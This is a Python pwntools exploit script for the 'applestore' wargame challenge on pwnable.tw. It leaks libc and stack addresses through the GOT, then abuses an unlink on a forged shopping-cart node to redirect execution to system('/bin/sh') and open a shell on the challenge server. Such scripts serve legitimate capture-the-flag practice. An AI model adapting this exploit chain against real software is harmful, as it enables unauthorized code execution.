from pwn import *

'''
=== Menu ===
1: Apple Store
2: Add into your shopping cart
3: Remove from your shopping cart
4: List your shopping cart
5: Checkout
6: Exit
'''

'''
=== Device List ===
1: iPhone 6 - $199             *5
2: iPhone 6 Plus - $299        *20
3: iPad Air 2 - $499
4: iPad Mini 3 - $399          
5: iPod Touch - $199           

'''

'''
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
'''
def add(idx):
    r.recvuntil(b">")
    r.sendline(b"2")
    r.recvuntil(b">")
    r.sendline(str(idx).encode())

def delete(idx):
    r.recvuntil(b">")
    r.sendline(b"3")
    r.recvuntil(b">")
    r.sendline(str(idx).encode())

def show():
    r.recvuntil(b">")
    r.sendline(b"4")
    r.recvuntil(b">")
    r.sendline(b"y")

def checkout():
    r.recvuntil(b">")
    r.sendline(b"5")
    r.recvuntil(b">")
    r.sendline(b"y")

libc = ELF('libc_32.so.6')
# print(hex(libc.symbols['asprintf']))
# system_offset = libc.symbols['system']

# r = process("./applestore")
r = remote("chall.pwnable.tw", 10104)
### 7174
for _ in range(5+1):
    add(1)
for _ in range(20):
    add(2)
checkout()

input("@")

for i in range(26):
    delete(1)

input("@")

### leak libc of __libc_start_main in GOT

r.recvuntil(b">")
r.sendline(b"3")
r.recvuntil(b">")
r.sendline(b'1a'+p32(0x804B03c)) 
r.recvuntil(b'Remove 1:')
leak_addr = u32(r.recv(4))
print(f'leak_addr: {hex(leak_addr)}')
# libc_base = leak_addr - 0x373d0
libc_base = leak_addr - libc.symbols['asprintf']
print(f'libc_base: {hex(libc_base)}')
# libc_system = libc_base + 0x28830
libc_system = libc_base + libc.symbols['system']
print(f'libc_system: {hex(libc_system)}')

input("@")

r.recvuntil(b">")
r.sendline(b"3")
r.recvuntil(b">")
r.sendline(b'1a'+p32(0x804B070))
r.recvuntil(b'Remove 1:')
leak_stack = u32(r.recv(4))
print(f'leak_stack: {hex(leak_stack)}')


target_ebp = leak_stack + 0x20
input("@")

r.recvuntil(b">")
r.sendline(b"3")
r.recvuntil(b">")
r.sendline(b'1a'
    + p32(0x804B070)
    + p32(0xdeadbeef)
    + p32(target_ebp - 0xc)
    + p32(0x804B040 + 0x22)
)

r.recvuntil(b">")
r.sendline(p32(libc_system) + b';/bin/sh\x00')
# r.recvuntil(b">")

# r.recvuntil(b">")
# r.sendline(b"3")
# r.recvuntil(b">")
# r.sendline(b'1a'
#     + p32(0x804B070)
#     + p32(0xdeadbeef)
#     + p32(0x804B030 - 0xc)
#     + p32(0x804B028 - 0x8)
# )

### *0x804B030 = 0x804B020
### *0x804B028 = 0x804B024

'''
0x804b020 <__stack_chk_fail@got.plt>:	0x080484e6	0xf7e2fdf0	0xf7e1acd0	0x08048516
0x804b030 <exit@got.plt>:	0x08048526	0xf7dc7df0	0xf7efaac0	0xf7dfd3d0


'''

# r.recvuntil(b'Remove 27:')
# leak_addr = u32(r.recv(4))
# print(hex(leak_addr))

# res = r.recvuntil(b'from your shopping cart.')
# print(res)
r.interactive()

'''
heap
struct note {
    uint32 product;
    uint32 price;
    uint32 fd;
    uint32 bk;
}
'''